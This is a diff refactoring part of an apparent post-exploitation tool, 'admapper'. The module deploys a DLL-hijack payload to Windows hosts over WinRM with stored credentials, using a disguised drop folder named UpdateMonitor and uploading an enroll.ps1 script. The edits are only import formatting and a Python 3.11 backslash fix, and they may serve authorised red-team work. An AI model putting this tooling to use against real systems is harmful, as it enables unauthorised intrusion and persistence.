@@ -6,18 +6,32 @@ from datetime import UTC, datetime
 from pathlib import Path
 from typing import TYPE_CHECKING, Any
 
-from admapper.core.connectivity import TargetUnreachableError, format_unreachable_message, require_target_reachable
+from admapper.core.connectivity import (
+    TargetUnreachableError,
+    format_unreachable_message,
+    require_target_reachable,
+)
+from admapper.core.json_io import load_json
 from admapper.core.output import ConfirmLevel, confirm, print_info, print_success, print_warning
 from admapper.models.workspace import OperationMode
 from admapper.postex.creds import WinRMCred, resolve_winrm_cred
-from admapper.postex.pe_arch import TargetArch, infer_arch_from_monitor_log, normalize_arch, ps_read_pe_arch_script
 from admapper.postex.payload import PayloadMode, prepare_hijack_payload
+from admapper.postex.pe_arch import (
+    TargetArch,
+    infer_arch_from_monitor_log,
+    normalize_arch,
+    ps_read_pe_arch_script,
+)
 from admapper.winrm.client import WinRMClient, WinRMError
 from admapper.winrm.factory import winrm_client_for_cred
 from admapper.winrm.upload import remote_file_ok, upload_file
 
 if TYPE_CHECKING:
     from admapper.core.session import Session
+
+# Literal backslash — kept out of f-string expressions for Python 3.11 compatibility
+# (escape sequences inside f-string replacement fields require Python 3.12+).
+_BACKSLASH = "\\"
 
 
 @dataclass
@@ -35,9 +49,7 @@ class DeployResult:
 
 
 def _load_json(path: Path) -> dict[str, Any] | None:
-    if not path.is_file():
-        return None
-    return json.loads(path.read_text(encoding="utf-8"))
+    return load_json(path)
 
 
 def _finding_from_scan(scan_data: dict[str, Any]) -> dict[str, Any] | None:
@@ -97,7 +109,7 @@ def _resolve_target_arch(
     if client is not None:
         drop = str(finding.get("drop_path") or r"C:\ProgramData\UpdateMonitor")
         for rel in (r"\Logs\monitor.log", r"\logs\monitor.log", r"\monitor.log"):
-            path = f"{drop.rstrip('\\')}{rel}"
+            path = f"{drop.rstrip(_BACKSLASH)}{rel}"
             safe = path.replace("'", "''")
             try:
                 proc = client.execute(
@@ -171,7 +183,7 @@ def deploy_dll_hijack(
         cred_id=cred_id,
         host=target_host or None,
     )
-    remote_path = f"{drop_path.rstrip('\\')}\\{zip_name}"
+    remote_path = f"{drop_path.rstrip(_BACKSLASH)}\\{zip_name}"
     client = _winrm_client(cred, session)
     target_arch = _resolve_target_arch(finding, scan, client=client, arch_override=arch)
     print_info(f"payload arch: {target_arch}")
@@ -262,13 +274,13 @@ def deploy_dll_hijack(
                 profile=enroll_profile,
                 run_as_user=run_as,
             )
-            enroll_remote = f"{drop_path.rstrip('\\')}\\enroll.ps1"
+            enroll_remote = f"{drop_path.rstrip(_BACKSLASH)}\\enroll.ps1"
             enroll_local = ws_path / "certs" / "enroll.ps1"
             enroll_local.parent.mkdir(parents=True, exist_ok=True)
             enroll_local.write_text(ps + "\n", encoding="utf-8")
             upload_file(client, enroll_local, enroll_remote, http_fetch_host=fetch_host)
             print_success(f"uploaded enroll.ps1 → {enroll_remote}")
-            log_remote = f"{drop_path.rstrip('\\')}\\enroll.log"
+            log_remote = f"{drop_path.rstrip(_BACKSLASH)}\\enroll.log"
             safe_marker = enroll_marker.replace("'", "''")
             safe_log = log_remote.replace("'", "''")
             client.execute(
